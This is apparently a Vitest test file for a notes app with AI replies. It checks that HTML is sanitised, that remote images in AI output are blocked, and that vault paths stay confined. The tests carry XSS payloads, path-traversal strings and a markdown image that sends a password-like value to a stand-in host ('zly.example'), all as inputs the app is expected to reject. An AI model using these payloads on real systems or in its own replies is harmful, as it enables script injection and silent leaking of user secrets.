import { describe, expect, it } from "vitest";
import { renderMarkdown, renderNote } from "../src/lib/render";
import { cleanPath } from "../shared/vault";

describe("security", () => {
  it("never renders raw HTML or script links from notes", () => {
    const { html } = renderNote('<img src=x onerror="alert(1)"> <script>alert(1)</script>\n\n[klik](javascript:alert(1)) [[a"><b onmouseover=alert(1)>]]');
    expect(html).not.toMatch(/<img|<script|<b /i);
    expect(html).not.toContain('href="javascript:');
  });

  it("AI replies show remote images as links (no silent data leaks)", () => {
    const html = renderMarkdown("![tajné](https://zly.example/x.png?d=heslo)", { blockRemoteImages: true });
    expect(html).not.toContain("<img");
    expect(html).toContain('href="https://zly.example/x.png?d=heslo"');
    // Notes themselves still show remote images.
    expect(renderMarkdown("![obrázek](https://example.com/a.png)")).toContain("<img");
  });

  it("reads image width from the alt text", () => {
    const html = renderMarkdown("![Graf|300](https://example.com/g.png)");
    expect(html).toContain('width="300"');
    expect(html).toContain('alt="Graf"');
  });

  it("refuses paths outside the vault", () => {
    for (const p of ["../tajne.txt", "a/../../b", "..\\..\\Windows\\x", "C:/Windows/x"]) expect(() => cleanPath(p)).toThrow();
    expect(cleanPath("./Projekty//Web.md")).toBe("Projekty/Web.md");
  });
});

describe("providers", async () => {
  const { PROVIDER_MAP } = await import("../shared/providers");
  it("NVIDIA lists only chat models", () => {
    const hide = PROVIDER_MAP.nvidia.hideModels!;
    for (const id of ["nvidia/nv-embedqa-mistral-7b-v2", "meta/llama-guard-4-12b", "nvidia/nemotron-4-340b-reward", "nvidia/nvclip"]) expect(hide.test(id)).toBe(true);
    for (const id of ["moonshotai/kimi-k2.6", "deepseek-ai/deepseek-v4.1-flash", "z-ai/glm-5.3", "nvidia/nemotron-3-super-120b-a12b"]) expect(hide.test(id)).toBe(false);
  });
});
